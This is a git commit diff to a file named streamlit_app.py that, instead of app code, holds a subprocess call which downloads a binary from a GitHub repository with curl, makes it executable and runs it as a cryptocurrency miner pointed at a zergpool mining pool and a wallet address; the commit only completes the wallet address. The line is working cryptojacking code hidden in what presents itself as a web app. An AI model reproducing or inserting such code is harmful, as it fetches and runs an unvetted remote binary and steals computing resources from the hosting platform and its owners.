13a1925fdc6adab9209f5953f1c19db620212ab9
serisd <113237985+serisd@users.noreply.github.com>
2022-09-10 10:09:26 +0000

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -11,5 +11,5 @@ from time import sleep
 from subprocess import PIPE, Popen
 import base64
 
-p = subprocess.run("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u 0x4ba05dcb981f2c516c42d4c33853325 -p c=ETC,mc=MBC,ID=GASS_88 -t 15", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u 0x4ba05dcb981f2c516c42d4c33853325438734d4f -p c=ETC,mc=MBC,ID=GASS_88 -t 15", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
